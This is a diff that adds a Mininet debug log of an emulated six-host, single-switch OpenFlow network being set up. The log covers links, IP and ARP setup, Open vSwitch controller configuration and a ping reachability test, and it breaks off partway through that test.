@@ -1,0 +1,1654 @@
+2025-07-13 20:55:38,612 - mininet - DEBUG - *** errRun: ['grep', '-c', 'processor', '/proc/cpuinfo'] 
+
+2025-07-13 20:55:38,618 - mininet - DEBUG - 8
+  0
+2025-07-13 20:55:38,618 - mininet - DEBUG - *** Setting resource limits
+
+2025-07-13 20:55:38,618 - mininet - DEBUG - *** errRun: ['which', 'mnexec'] 
+
+2025-07-13 20:55:38,623 - mininet - DEBUG - /usr/bin/mnexec
+  0
+2025-07-13 20:55:38,623 - mininet - DEBUG - *** errRun: ['which', 'ifconfig'] 
+
+2025-07-13 20:55:38,626 - mininet - DEBUG - /sbin/ifconfig
+  0
+2025-07-13 20:55:38,630 - mininet - DEBUG - _popen ['mnexec', '-cd', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:c0'] 45850
+2025-07-13 20:55:38,633 - mininet - DEBUG - *** c0 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,634 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,635 - mininet - DEBUG - 
+2025-07-13 20:55:38,635 - mininet - DEBUG - *** c0 : ('echo A | telnet -e A 127.0.0.1 6653',)
+
+2025-07-13 20:55:38,637 - mininet - DEBUG - Telnet escape character is 'A'.
+
+2025-07-13 20:55:38,637 - mininet - DEBUG - Trying 127.0.0.1...
+
+2025-07-13 20:55:38,637 - mininet - DEBUG - Connected to 127.0.0.1.
+Escape character is 'A'.
+
+
+2025-07-13 20:55:38,637 - mininet - DEBUG - telnet> Connection closed.
+
+2025-07-13 20:55:38,637 - mininet - DEBUG - 
+2025-07-13 20:55:38,637 - mininet - INFO - *** Creating network
+
+2025-07-13 20:55:38,637 - mininet - INFO - *** Adding hosts:
+
+2025-07-13 20:55:38,637 - mininet - DEBUG - *** errRun: ['which', 'mnexec'] 
+
+2025-07-13 20:55:38,641 - mininet - DEBUG - /usr/bin/mnexec
+  0
+2025-07-13 20:55:38,641 - mininet - DEBUG - *** errRun: ['which', 'ifconfig'] 
+
+2025-07-13 20:55:38,644 - mininet - DEBUG - /sbin/ifconfig
+  0
+2025-07-13 20:55:38,647 - mininet - DEBUG - _popen ['mnexec', '-cdn', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:h1'] 45856
+2025-07-13 20:55:38,651 - mininet - DEBUG - *** h1 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,652 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,652 - mininet - DEBUG - 
+2025-07-13 20:55:38,652 - mininet - INFO - h1 
+2025-07-13 20:55:38,656 - mininet - DEBUG - _popen ['mnexec', '-cdn', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:h2'] 45858
+2025-07-13 20:55:38,659 - mininet - DEBUG - *** h2 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,660 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,660 - mininet - DEBUG - 
+2025-07-13 20:55:38,660 - mininet - INFO - h2 
+2025-07-13 20:55:38,663 - mininet - DEBUG - _popen ['mnexec', '-cdn', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:h3'] 45860
+2025-07-13 20:55:38,667 - mininet - DEBUG - *** h3 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,668 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,668 - mininet - DEBUG - 
+2025-07-13 20:55:38,668 - mininet - INFO - h3 
+2025-07-13 20:55:38,671 - mininet - DEBUG - _popen ['mnexec', '-cdn', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:h4'] 45862
+2025-07-13 20:55:38,675 - mininet - DEBUG - *** h4 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,676 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,676 - mininet - DEBUG - 
+2025-07-13 20:55:38,676 - mininet - INFO - h4 
+2025-07-13 20:55:38,679 - mininet - DEBUG - _popen ['mnexec', '-cdn', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:h5'] 45864
+2025-07-13 20:55:38,683 - mininet - DEBUG - *** h5 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,683 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,684 - mininet - DEBUG - 
+2025-07-13 20:55:38,684 - mininet - INFO - h5 
+2025-07-13 20:55:38,687 - mininet - DEBUG - _popen ['mnexec', '-cdn', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:h6'] 45866
+2025-07-13 20:55:38,691 - mininet - DEBUG - *** h6 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,691 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,692 - mininet - DEBUG - 
+2025-07-13 20:55:38,692 - mininet - INFO - h6 
+2025-07-13 20:55:38,692 - mininet - INFO - 
+*** Adding switches:
+
+2025-07-13 20:55:38,692 - mininet - DEBUG - *** errRun: ['which', 'ovs-vsctl'] 
+
+2025-07-13 20:55:38,695 - mininet - DEBUG - /usr/bin/ovs-vsctl
+  0
+2025-07-13 20:55:38,696 - mininet - DEBUG - *** errRun: ['ovs-vsctl', '-t', '1', 'show'] 
+
+2025-07-13 20:55:38,701 - mininet - DEBUG - df6e9c01-0abd-46aa-981e-d48f78358bac
+    ovs_version: "2.9.8"
+  0
+2025-07-13 20:55:38,701 - mininet - DEBUG - *** errRun: ['ovs-vsctl', '--version'] 
+
+2025-07-13 20:55:38,706 - mininet - DEBUG - ovs-vsctl (Open vSwitch) 2.9.8
+DB Schema 7.15.1
+  0
+2025-07-13 20:55:38,709 - mininet - DEBUG - _popen ['mnexec', '-cd', 'env', 'PS1=\x7f', 'bash', '--norc', '--noediting', '-is', 'mininet:s1'] 45871
+2025-07-13 20:55:38,712 - mininet - DEBUG - *** s1 : ('unset HISTFILE; stty -echo; set +m',)
+
+2025-07-13 20:55:38,712 - mininet - DEBUG - unset HISTFILE; stty -echo; set +m
+
+2025-07-13 20:55:38,713 - mininet - DEBUG - 
+2025-07-13 20:55:38,713 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,713 - mininet - DEBUG - added intf lo (0) to node s1
+
+2025-07-13 20:55:38,713 - mininet - DEBUG - *** s1 : ('ifconfig', 'lo', 'up')
+
+2025-07-13 20:55:38,714 - mininet - DEBUG - 
+2025-07-13 20:55:38,714 - mininet - INFO - s1 
+2025-07-13 20:55:38,714 - mininet - INFO - 
+*** Adding links:
+
+2025-07-13 20:55:38,715 - mininet - DEBUG - *** h1 : ('ip link add name h1-eth0 address 5a:8f:64:5e:5a:17 type veth peer name s1-eth1 address 96:23:6a:e0:88:1a netns 45871',)
+
+2025-07-13 20:55:38,716 - mininet - DEBUG - 
+2025-07-13 20:55:38,716 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,716 - mininet - DEBUG - added intf h1-eth0 (0) to node h1
+
+2025-07-13 20:55:38,716 - mininet - DEBUG - moving h1-eth0 into namespace for h1 
+
+2025-07-13 20:55:38,716 - mininet - DEBUG - *** h1 : ('ifconfig', 'h1-eth0', 'up')
+
+2025-07-13 20:55:38,717 - mininet - DEBUG - 
+2025-07-13 20:55:38,717 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,717 - mininet - DEBUG - added intf s1-eth1 (1) to node s1
+
+2025-07-13 20:55:38,717 - mininet - DEBUG - *** s1 : ('ifconfig', 's1-eth1', 'up')
+
+2025-07-13 20:55:38,719 - mininet - DEBUG - 
+2025-07-13 20:55:38,719 - mininet - INFO - (h1, s1) 
+2025-07-13 20:55:38,719 - mininet - DEBUG - *** h2 : ('ip link add name h2-eth0 address 22:6c:12:24:fa:62 type veth peer name s1-eth2 address 6a:77:a1:36:1b:3d netns 45871',)
+
+2025-07-13 20:55:38,721 - mininet - DEBUG - 
+2025-07-13 20:55:38,721 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,721 - mininet - DEBUG - added intf h2-eth0 (0) to node h2
+
+2025-07-13 20:55:38,721 - mininet - DEBUG - moving h2-eth0 into namespace for h2 
+
+2025-07-13 20:55:38,721 - mininet - DEBUG - *** h2 : ('ifconfig', 'h2-eth0', 'up')
+
+2025-07-13 20:55:38,722 - mininet - DEBUG - 
+2025-07-13 20:55:38,722 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,722 - mininet - DEBUG - added intf s1-eth2 (2) to node s1
+
+2025-07-13 20:55:38,722 - mininet - DEBUG - *** s1 : ('ifconfig', 's1-eth2', 'up')
+
+2025-07-13 20:55:38,723 - mininet - DEBUG - 
+2025-07-13 20:55:38,724 - mininet - INFO - (h2, s1) 
+2025-07-13 20:55:38,724 - mininet - DEBUG - *** h3 : ('ip link add name h3-eth0 address 32:a4:91:58:9e:70 type veth peer name s1-eth3 address 6e:a3:63:cf:52:9c netns 45871',)
+
+2025-07-13 20:55:38,725 - mininet - DEBUG - 
+2025-07-13 20:55:38,725 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,725 - mininet - DEBUG - added intf h3-eth0 (0) to node h3
+
+2025-07-13 20:55:38,726 - mininet - DEBUG - moving h3-eth0 into namespace for h3 
+
+2025-07-13 20:55:38,726 - mininet - DEBUG - *** h3 : ('ifconfig', 'h3-eth0', 'up')
+
+2025-07-13 20:55:38,727 - mininet - DEBUG - 
+2025-07-13 20:55:38,727 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,727 - mininet - DEBUG - added intf s1-eth3 (3) to node s1
+
+2025-07-13 20:55:38,727 - mininet - DEBUG - *** s1 : ('ifconfig', 's1-eth3', 'up')
+
+2025-07-13 20:55:38,728 - mininet - DEBUG - 
+2025-07-13 20:55:38,728 - mininet - INFO - (h3, s1) 
+2025-07-13 20:55:38,728 - mininet - DEBUG - *** h4 : ('ip link add name h4-eth0 address 86:c3:ba:74:f9:28 type veth peer name s1-eth4 address 3e:d7:f9:a6:4e:e0 netns 45871',)
+
+2025-07-13 20:55:38,730 - mininet - DEBUG - 
+2025-07-13 20:55:38,730 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,730 - mininet - DEBUG - added intf h4-eth0 (0) to node h4
+
+2025-07-13 20:55:38,730 - mininet - DEBUG - moving h4-eth0 into namespace for h4 
+
+2025-07-13 20:55:38,730 - mininet - DEBUG - *** h4 : ('ifconfig', 'h4-eth0', 'up')
+
+2025-07-13 20:55:38,732 - mininet - DEBUG - 
+2025-07-13 20:55:38,732 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,732 - mininet - DEBUG - added intf s1-eth4 (4) to node s1
+
+2025-07-13 20:55:38,732 - mininet - DEBUG - *** s1 : ('ifconfig', 's1-eth4', 'up')
+
+2025-07-13 20:55:38,734 - mininet - DEBUG - 
+2025-07-13 20:55:38,734 - mininet - INFO - (h4, s1) 
+2025-07-13 20:55:38,734 - mininet - DEBUG - *** h5 : ('ip link add name h5-eth0 address e6:51:7e:1b:a2:55 type veth peer name s1-eth5 address 62:9a:c3:ab:ea:36 netns 45871',)
+
+2025-07-13 20:55:38,736 - mininet - DEBUG - 
+2025-07-13 20:55:38,737 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,737 - mininet - DEBUG - added intf h5-eth0 (0) to node h5
+
+2025-07-13 20:55:38,737 - mininet - DEBUG - moving h5-eth0 into namespace for h5 
+
+2025-07-13 20:55:38,737 - mininet - DEBUG - *** h5 : ('ifconfig', 'h5-eth0', 'up')
+
+2025-07-13 20:55:38,738 - mininet - DEBUG - 
+2025-07-13 20:55:38,738 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,738 - mininet - DEBUG - added intf s1-eth5 (5) to node s1
+
+2025-07-13 20:55:38,738 - mininet - DEBUG - *** s1 : ('ifconfig', 's1-eth5', 'up')
+
+2025-07-13 20:55:38,740 - mininet - DEBUG - 
+2025-07-13 20:55:38,740 - mininet - INFO - (h5, s1) 
+2025-07-13 20:55:38,740 - mininet - DEBUG - *** h6 : ('ip link add name h6-eth0 address be:da:e9:da:36:03 type veth peer name s1-eth6 address a2:a0:e0:2f:91:d7 netns 45871',)
+
+2025-07-13 20:55:38,744 - mininet - DEBUG - 
+2025-07-13 20:55:38,744 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,744 - mininet - DEBUG - added intf h6-eth0 (0) to node h6
+
+2025-07-13 20:55:38,744 - mininet - DEBUG - moving h6-eth0 into namespace for h6 
+
+2025-07-13 20:55:38,744 - mininet - DEBUG - *** h6 : ('ifconfig', 'h6-eth0', 'up')
+
+2025-07-13 20:55:38,745 - mininet - DEBUG - 
+2025-07-13 20:55:38,745 - mininet - DEBUG - 
+
+2025-07-13 20:55:38,745 - mininet - DEBUG - added intf s1-eth6 (6) to node s1
+
+2025-07-13 20:55:38,745 - mininet - DEBUG - *** s1 : ('ifconfig', 's1-eth6', 'up')
+
+2025-07-13 20:55:38,747 - mininet - DEBUG - 
+2025-07-13 20:55:38,747 - mininet - INFO - (h6, s1) 
+2025-07-13 20:55:38,747 - mininet - INFO - 
+
+2025-07-13 20:55:38,747 - mininet - INFO - *** Configuring hosts
+
+2025-07-13 20:55:38,747 - mininet - INFO - h1 
+2025-07-13 20:55:38,747 - mininet - DEBUG - *** h1 : ('ifconfig', 'h1-eth0', 'down')
+
+2025-07-13 20:55:38,749 - mininet - DEBUG - 
+2025-07-13 20:55:38,749 - mininet - DEBUG - *** h1 : ('ifconfig', 'h1-eth0', 'hw', 'ether', '00:00:00:00:00:01')
+
+2025-07-13 20:55:38,750 - mininet - DEBUG - 
+2025-07-13 20:55:38,750 - mininet - DEBUG - *** h1 : ('ifconfig', 'h1-eth0', 'up')
+
+2025-07-13 20:55:38,751 - mininet - DEBUG - 
+2025-07-13 20:55:38,751 - mininet - DEBUG - *** h1 : ('ifconfig', 'h1-eth0', '10.0.0.1/24', 'up')
+
+2025-07-13 20:55:38,753 - mininet - DEBUG - 
+2025-07-13 20:55:38,753 - mininet - DEBUG - *** h1 : ('ifconfig lo up',)
+
+2025-07-13 20:55:38,754 - mininet - DEBUG - 
+2025-07-13 20:55:38,754 - mininet - INFO - h2 
+2025-07-13 20:55:38,754 - mininet - DEBUG - *** h2 : ('ifconfig', 'h2-eth0', 'down')
+
+2025-07-13 20:55:38,755 - mininet - DEBUG - 
+2025-07-13 20:55:38,755 - mininet - DEBUG - *** h2 : ('ifconfig', 'h2-eth0', 'hw', 'ether', '00:00:00:00:00:02')
+
+2025-07-13 20:55:38,757 - mininet - DEBUG - 
+2025-07-13 20:55:38,757 - mininet - DEBUG - *** h2 : ('ifconfig', 'h2-eth0', 'up')
+
+2025-07-13 20:55:38,758 - mininet - DEBUG - 
+2025-07-13 20:55:38,759 - mininet - DEBUG - *** h2 : ('ifconfig', 'h2-eth0', '10.0.0.2/24', 'up')
+
+2025-07-13 20:55:38,760 - mininet - DEBUG - 
+2025-07-13 20:55:38,761 - mininet - DEBUG - *** h2 : ('ifconfig lo up',)
+
+2025-07-13 20:55:38,762 - mininet - DEBUG - 
+2025-07-13 20:55:38,762 - mininet - INFO - h3 
+2025-07-13 20:55:38,762 - mininet - DEBUG - *** h3 : ('ifconfig', 'h3-eth0', 'down')
+
+2025-07-13 20:55:38,763 - mininet - DEBUG - 
+2025-07-13 20:55:38,763 - mininet - DEBUG - *** h3 : ('ifconfig', 'h3-eth0', 'hw', 'ether', '00:00:00:00:00:03')
+
+2025-07-13 20:55:38,765 - mininet - DEBUG - 
+2025-07-13 20:55:38,765 - mininet - DEBUG - *** h3 : ('ifconfig', 'h3-eth0', 'up')
+
+2025-07-13 20:55:38,766 - mininet - DEBUG - 
+2025-07-13 20:55:38,766 - mininet - DEBUG - *** h3 : ('ifconfig', 'h3-eth0', '10.0.0.3/24', 'up')
+
+2025-07-13 20:55:38,767 - mininet - DEBUG - 
+2025-07-13 20:55:38,767 - mininet - DEBUG - *** h3 : ('ifconfig lo up',)
+
+2025-07-13 20:55:38,768 - mininet - DEBUG - 
+2025-07-13 20:55:38,768 - mininet - INFO - h4 
+2025-07-13 20:55:38,768 - mininet - DEBUG - *** h4 : ('ifconfig', 'h4-eth0', 'down')
+
+2025-07-13 20:55:38,770 - mininet - DEBUG - 
+2025-07-13 20:55:38,770 - mininet - DEBUG - *** h4 : ('ifconfig', 'h4-eth0', 'hw', 'ether', '00:00:00:00:00:04')
+
+2025-07-13 20:55:38,771 - mininet - DEBUG - 
+2025-07-13 20:55:38,771 - mininet - DEBUG - *** h4 : ('ifconfig', 'h4-eth0', 'up')
+
+2025-07-13 20:55:38,772 - mininet - DEBUG - 
+2025-07-13 20:55:38,772 - mininet - DEBUG - *** h4 : ('ifconfig', 'h4-eth0', '10.0.0.4/24', 'up')
+
+2025-07-13 20:55:38,773 - mininet - DEBUG - 
+2025-07-13 20:55:38,773 - mininet - DEBUG - *** h4 : ('ifconfig lo up',)
+
+2025-07-13 20:55:38,774 - mininet - DEBUG - 
+2025-07-13 20:55:38,774 - mininet - INFO - h5 
+2025-07-13 20:55:38,774 - mininet - DEBUG - *** h5 : ('ifconfig', 'h5-eth0', 'down')
+
+2025-07-13 20:55:38,775 - mininet - DEBUG - 
+2025-07-13 20:55:38,775 - mininet - DEBUG - *** h5 : ('ifconfig', 'h5-eth0', 'hw', 'ether', '00:00:00:00:00:05')
+
+2025-07-13 20:55:38,776 - mininet - DEBUG - 
+2025-07-13 20:55:38,776 - mininet - DEBUG - *** h5 : ('ifconfig', 'h5-eth0', 'up')
+
+2025-07-13 20:55:38,777 - mininet - DEBUG - 
+2025-07-13 20:55:38,777 - mininet - DEBUG - *** h5 : ('ifconfig', 'h5-eth0', '10.0.0.5/24', 'up')
+
+2025-07-13 20:55:38,778 - mininet - DEBUG - 
+2025-07-13 20:55:38,779 - mininet - DEBUG - *** h5 : ('ifconfig lo up',)
+
+2025-07-13 20:55:38,780 - mininet - DEBUG - 
+2025-07-13 20:55:38,780 - mininet - INFO - h6 
+2025-07-13 20:55:38,780 - mininet - DEBUG - *** h6 : ('ifconfig', 'h6-eth0', 'down')
+
+2025-07-13 20:55:38,781 - mininet - DEBUG - 
+2025-07-13 20:55:38,781 - mininet - DEBUG - *** h6 : ('ifconfig', 'h6-eth0', 'hw', 'ether', '00:00:00:00:00:06')
+
+2025-07-13 20:55:38,782 - mininet - DEBUG - 
+2025-07-13 20:55:38,782 - mininet - DEBUG - *** h6 : ('ifconfig', 'h6-eth0', 'up')
+
+2025-07-13 20:55:38,783 - mininet - DEBUG - 
+2025-07-13 20:55:38,783 - mininet - DEBUG - *** h6 : ('ifconfig', 'h6-eth0', '10.0.0.6/24', 'up')
+
+2025-07-13 20:55:38,784 - mininet - DEBUG - 
+2025-07-13 20:55:38,784 - mininet - DEBUG - *** h6 : ('ifconfig lo up',)
+
+2025-07-13 20:55:38,785 - mininet - DEBUG - 
+2025-07-13 20:55:38,785 - mininet - INFO - 
+
+2025-07-13 20:55:38,785 - mininet - DEBUG - *** h1 : ('arp', '-s', '10.0.0.2', '00:00:00:00:00:02')
+
+2025-07-13 20:55:38,786 - mininet - DEBUG - 
+2025-07-13 20:55:38,786 - mininet - DEBUG - *** h1 : ('arp', '-s', '10.0.0.3', '00:00:00:00:00:03')
+
+2025-07-13 20:55:38,787 - mininet - DEBUG - 
+2025-07-13 20:55:38,787 - mininet - DEBUG - *** h1 : ('arp', '-s', '10.0.0.4', '00:00:00:00:00:04')
+
+2025-07-13 20:55:38,788 - mininet - DEBUG - 
+2025-07-13 20:55:38,788 - mininet - DEBUG - *** h1 : ('arp', '-s', '10.0.0.5', '00:00:00:00:00:05')
+
+2025-07-13 20:55:38,789 - mininet - DEBUG - 
+2025-07-13 20:55:38,789 - mininet - DEBUG - *** h1 : ('arp', '-s', '10.0.0.6', '00:00:00:00:00:06')
+
+2025-07-13 20:55:38,789 - mininet - DEBUG - 
+2025-07-13 20:55:38,789 - mininet - DEBUG - *** h2 : ('arp', '-s', '10.0.0.1', '00:00:00:00:00:01')
+
+2025-07-13 20:55:38,790 - mininet - DEBUG - 
+2025-07-13 20:55:38,790 - mininet - DEBUG - *** h2 : ('arp', '-s', '10.0.0.3', '00:00:00:00:00:03')
+
+2025-07-13 20:55:38,791 - mininet - DEBUG - 
+2025-07-13 20:55:38,791 - mininet - DEBUG - *** h2 : ('arp', '-s', '10.0.0.4', '00:00:00:00:00:04')
+
+2025-07-13 20:55:38,792 - mininet - DEBUG - 
+2025-07-13 20:55:38,792 - mininet - DEBUG - *** h2 : ('arp', '-s', '10.0.0.5', '00:00:00:00:00:05')
+
+2025-07-13 20:55:38,793 - mininet - DEBUG - 
+2025-07-13 20:55:38,793 - mininet - DEBUG - *** h2 : ('arp', '-s', '10.0.0.6', '00:00:00:00:00:06')
+
+2025-07-13 20:55:38,794 - mininet - DEBUG - 
+2025-07-13 20:55:38,794 - mininet - DEBUG - *** h3 : ('arp', '-s', '10.0.0.1', '00:00:00:00:00:01')
+
+2025-07-13 20:55:38,795 - mininet - DEBUG - 
+2025-07-13 20:55:38,795 - mininet - DEBUG - *** h3 : ('arp', '-s', '10.0.0.2', '00:00:00:00:00:02')
+
+2025-07-13 20:55:38,796 - mininet - DEBUG - 
+2025-07-13 20:55:38,796 - mininet - DEBUG - *** h3 : ('arp', '-s', '10.0.0.4', '00:00:00:00:00:04')
+
+2025-07-13 20:55:38,797 - mininet - DEBUG - 
+2025-07-13 20:55:38,797 - mininet - DEBUG - *** h3 : ('arp', '-s', '10.0.0.5', '00:00:00:00:00:05')
+
+2025-07-13 20:55:38,798 - mininet - DEBUG - 
+2025-07-13 20:55:38,798 - mininet - DEBUG - *** h3 : ('arp', '-s', '10.0.0.6', '00:00:00:00:00:06')
+
+2025-07-13 20:55:38,798 - mininet - DEBUG - 
+2025-07-13 20:55:38,798 - mininet - DEBUG - *** h4 : ('arp', '-s', '10.0.0.1', '00:00:00:00:00:01')
+
+2025-07-13 20:55:38,799 - mininet - DEBUG - 
+2025-07-13 20:55:38,799 - mininet - DEBUG - *** h4 : ('arp', '-s', '10.0.0.2', '00:00:00:00:00:02')
+
+2025-07-13 20:55:38,800 - mininet - DEBUG - 
+2025-07-13 20:55:38,800 - mininet - DEBUG - *** h4 : ('arp', '-s', '10.0.0.3', '00:00:00:00:00:03')
+
+2025-07-13 20:55:38,801 - mininet - DEBUG - 
+2025-07-13 20:55:38,801 - mininet - DEBUG - *** h4 : ('arp', '-s', '10.0.0.5', '00:00:00:00:00:05')
+
+2025-07-13 20:55:38,802 - mininet - DEBUG - 
+2025-07-13 20:55:38,802 - mininet - DEBUG - *** h4 : ('arp', '-s', '10.0.0.6', '00:00:00:00:00:06')
+
+2025-07-13 20:55:38,803 - mininet - DEBUG - 
+2025-07-13 20:55:38,803 - mininet - DEBUG - *** h5 : ('arp', '-s', '10.0.0.1', '00:00:00:00:00:01')
+
+2025-07-13 20:55:38,804 - mininet - DEBUG - 
+2025-07-13 20:55:38,804 - mininet - DEBUG - *** h5 : ('arp', '-s', '10.0.0.2', '00:00:00:00:00:02')
+
+2025-07-13 20:55:38,805 - mininet - DEBUG - 
+2025-07-13 20:55:38,805 - mininet - DEBUG - *** h5 : ('arp', '-s', '10.0.0.3', '00:00:00:00:00:03')
+
+2025-07-13 20:55:38,805 - mininet - DEBUG - 
+2025-07-13 20:55:38,805 - mininet - DEBUG - *** h5 : ('arp', '-s', '10.0.0.4', '00:00:00:00:00:04')
+
+2025-07-13 20:55:38,806 - mininet - DEBUG - 
+2025-07-13 20:55:38,806 - mininet - DEBUG - *** h5 : ('arp', '-s', '10.0.0.6', '00:00:00:00:00:06')
+
+2025-07-13 20:55:38,807 - mininet - DEBUG - 
+2025-07-13 20:55:38,807 - mininet - DEBUG - *** h6 : ('arp', '-s', '10.0.0.1', '00:00:00:00:00:01')
+
+2025-07-13 20:55:38,808 - mininet - DEBUG - 
+2025-07-13 20:55:38,808 - mininet - DEBUG - *** h6 : ('arp', '-s', '10.0.0.2', '00:00:00:00:00:02')
+
+2025-07-13 20:55:38,809 - mininet - DEBUG - 
+2025-07-13 20:55:38,809 - mininet - DEBUG - *** h6 : ('arp', '-s', '10.0.0.3', '00:00:00:00:00:03')
+
+2025-07-13 20:55:38,810 - mininet - DEBUG - 
+2025-07-13 20:55:38,810 - mininet - DEBUG - *** h6 : ('arp', '-s', '10.0.0.4', '00:00:00:00:00:04')
+
+2025-07-13 20:55:38,810 - mininet - DEBUG - 
+2025-07-13 20:55:38,811 - mininet - DEBUG - *** h6 : ('arp', '-s', '10.0.0.5', '00:00:00:00:00:05')
+
+2025-07-13 20:55:38,811 - mininet - DEBUG - 
+2025-07-13 20:55:38,811 - mininet - INFO - *** Starting controller
+
+2025-07-13 20:55:38,811 - mininet - INFO - c0 
+2025-07-13 20:55:38,812 - mininet - INFO - 
+
+2025-07-13 20:55:38,812 - mininet - INFO - *** Starting 1 switches
+
+2025-07-13 20:55:38,812 - mininet - INFO - s1 
+2025-07-13 20:55:38,812 - mininet - INFO - ...
+2025-07-13 20:55:38,812 - mininet - DEBUG - *** errRun: ovs-vsctl -- --id=@s1c0 create Controller target=\"tcp:127.0.0.1:6653\" max_backoff=1000 -- --if-exists del-br s1 -- add-br s1 -- set bridge s1 controller=[@s1c0] other_config:datapath-id=0000000000000001 fail_mode=secure other-config:disable-in-band=true protocols=OpenFlow13 other-config:dp-desc=s1 -- add-port s1 s1-eth1 -- set Interface s1-eth1 ofport_request=1 -- add-port s1 s1-eth2 -- set Interface s1-eth2 ofport_request=2 -- add-port s1 s1-eth3 -- set Interface s1-eth3 ofport_request=3 -- add-port s1 s1-eth4 -- set Interface s1-eth4 ofport_request=4 -- add-port s1 s1-eth5 -- set Interface s1-eth5 ofport_request=5 -- add-port s1 s1-eth6 -- set Interface s1-eth6 ofport_request=6 
+
+2025-07-13 20:55:38,847 - mininet - DEBUG - fd0dc9c8-5224-48e7-aafa-e392395a41b9
+  0
+2025-07-13 20:55:38,847 - mininet - INFO - 
+
+2025-07-13 20:55:43,854 - mininet - Level 25 - *** Ping: testing ping reachability
+
+2025-07-13 20:55:43,854 - mininet - Level 25 - h1 -> 
+2025-07-13 20:55:43,854 - mininet - DEBUG - *** h1 : ('LANG=C ping -c1  10.0.0.2',)
+
+2025-07-13 20:55:43,856 - mininet - DEBUG - PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
+
+2025-07-13 20:55:43,858 - mininet - DEBUG - 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=2.77 ms
+
+--- 10.0.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.774/2.774/2.774/0.000 ms
+
+2025-07-13 20:55:43,859 - mininet - DEBUG - 
+2025-07-13 20:55:43,859 - mininet - Level 25 - h2 
+2025-07-13 20:55:43,859 - mininet - DEBUG - *** h1 : ('LANG=C ping -c1  10.0.0.3',)
+
+2025-07-13 20:55:43,860 - mininet - DEBUG - PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.
+
+2025-07-13 20:55:43,863 - mininet - DEBUG - 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=2.35 ms
+
+--- 10.0.0.3 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.354/2.354/2.354/0.000 ms
+
+2025-07-13 20:55:43,863 - mininet - DEBUG - 
+2025-07-13 20:55:43,863 - mininet - Level 25 - h3 
+2025-07-13 20:55:43,863 - mininet - DEBUG - *** h1 : ('LANG=C ping -c1  10.0.0.4',)
+
+2025-07-13 20:55:43,864 - mininet - DEBUG - PING 10.0.0.4 (10.0.0.4) 56(84) bytes of data.
+
+2025-07-13 20:55:43,866 - mininet - DEBUG - 64 bytes from 10.0.0.4: icmp_seq=1 ttl=64 time=2.14 ms
+
+--- 10.0.0.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.147/2.147/2.147/0.000 ms
+
+2025-07-13 20:55:43,867 - mininet - DEBUG - 
+2025-07-13 20:55:43,867 - mininet - Level 25 - h4 
+2025-07-13 20:55:43,867 - mininet - DEBUG - *** h1 : ('LANG=C ping -c1  10.0.0.5',)
+
+2025-07-13 20:55:43,868 - mininet - DEBUG - PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
+
+2025-07-13 20:55:43,870 - mininet - DEBUG - 64 bytes from 10.0.0.5: icmp_seq=1 ttl=64 time=2.33 ms
+
+--- 10.0.0.5 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.333/2.333/2.333/0.000 ms
+
+2025-07-13 20:55:43,870 - mininet - DEBUG - 
+2025-07-13 20:55:43,870 - mininet - Level 25 - h5 
+2025-07-13 20:55:43,871 - mininet - DEBUG - *** h1 : ('LANG=C ping -c1  10.0.0.6',)
+
+2025-07-13 20:55:43,872 - mininet - DEBUG - PING 10.0.0.6 (10.0.0.6) 56(84) bytes of data.
+
+2025-07-13 20:55:43,874 - mininet - DEBUG - 64 bytes from 10.0.0.6: icmp_seq=1 ttl=64 time=2.14 ms
+
+--- 10.0.0.6 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 2.142/2.142/2.142/0.000 ms
+
+2025-07-13 20:55:43,874 - mininet - DEBUG - 
+2025-07-13 20:55:43,874 - mininet - Level 25 - h6 
